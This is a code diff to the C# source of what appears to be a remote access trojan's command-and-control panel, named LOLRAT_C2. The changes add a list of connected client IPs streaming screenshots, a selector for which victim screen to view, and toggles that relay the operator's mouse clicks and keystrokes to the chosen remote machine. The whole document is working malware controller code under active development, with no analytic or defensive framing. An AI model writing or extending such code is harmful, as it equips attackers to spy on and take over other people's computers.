@@ -19,6 +19,10 @@ namespace LOLRAT_C2
         private Image receivedImageSS;
         // Add a reference to the Main class
         private Main mainInstance;
+        public string currentViewingIP = "";
+
+        public bool mouseControlEnabled = false;
+        public bool keyboardControlEnabled = false;
 
         public SS(Main mainInstance)
         {
@@ -74,9 +78,25 @@ namespace LOLRAT_C2
             int imageY = (int)(e.Y * imageScaleY);
 
             // Call the ExecuteMouseClick method on the main instance
-            mainInstance.ExecuteMouseClick(imageX, imageY, "left");
+            if (mouseControlEnabled)
+            {
+                mainInstance.ExecuteMouseClick(imageX, imageY, "left", currentViewingIP);
+                //MessageBox.Show($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
+            }
+        }
 
-            MessageBox.Show($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
+        // Add a method that will be called when a key is pressed and log the key
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+            // Convert keyData to string
+            string keyDataString = keyData.ToString();
+
+            if (keyboardControlEnabled)
+            {
+                mainInstance.ExecuteKeyboardClick(keyDataString, currentViewingIP);
+                MessageBox.Show($"Pressed key: {keyDataString}");
+            }
+            return base.ProcessCmdKey(ref msg, keyData); // Call the base method
         }
 
         // Add a method that will be called when the form exits
@@ -119,17 +139,38 @@ namespace LOLRAT_C2
                                 byte[] imageData = reader.ReadBytes(imageSize);
                                 using (MemoryStream memoryStream = new MemoryStream(imageData))
                                 {
-                                    receivedImageSS = Image.FromStream(memoryStream);
-                                }
+                                    currentViewingIP = clientAddress;
+                                    // Add IP to cbSSIPS
+                                    cbSSIPS.Invoke((MethodInvoker)delegate
+                                    {
+                                        // Check if it already exists
+                                        if (!cbSSIPS.Items.Contains(clientAddress))
+                                        {
+                                            cbSSIPS.Items.Add(clientAddress);
+                                        }
+                                    });
 
-                                // Display the received image in the PictureBox (Invoke on the main thread)
-                                pbSS.Invoke((MethodInvoker)delegate
-                                {
-                                    pbSS.Invalidate();
-                                    pbSS.Image = receivedImageSS;
-                                    pbSS.Invalidate();
-                                    pbSS.Refresh();
-                                });
+                                    // Apply the image to the receivedImageSS variable (So that it can be used later.)
+                                    receivedImageSS = Image.FromStream(memoryStream);
+
+                                    // Check if the current IP is selected in cbSSIPS
+                                    if (cbSSIPS.SelectedItem != null && cbSSIPS.SelectedItem.ToString() == clientAddress)
+                                    {
+                                        // Display the received image in the PictureBox (Invoke on the main thread)
+                                        pbSS.Invoke((MethodInvoker)delegate
+                                        {
+                                            pbSS.Invalidate();
+                                            pbSS.Image = receivedImageSS;
+                                            pbSS.Invalidate();
+                                            pbSS.Refresh();
+                                        });
+                                    }
+                                    else // If the current IP is not selected in cbSSIPS
+                                    {
+                                        // Display the received image in the PictureBox (Invoke on the main thread)
+                                        Console.WriteLine("Received image from " + clientAddress + " but it is not selected in cbSSIPS. Not displaying.");
+                                    }
+                                }
                             }
                             else
                             {
@@ -153,6 +194,31 @@ namespace LOLRAT_C2
             StopListening();
 
             base.OnFormClosing(e);
+        }
+
+        private void cbMouseControl_CheckedChanged(object sender, EventArgs e)
+        {
+            if (mouseControlEnabled)
+            {
+                mouseControlEnabled = false;
+            }
+            else
+            {
+                mouseControlEnabled = true;
+            }
+        }
+
+        private void cbKeyboardControl_CheckedChanged(object sender, EventArgs e)
+        {
+            if (keyboardControlEnabled)
+            {
+                keyboardControlEnabled = false;
+            }
+            else
+            {
+                keyboardControlEnabled = true;
+            }
+
         }
     }
 }
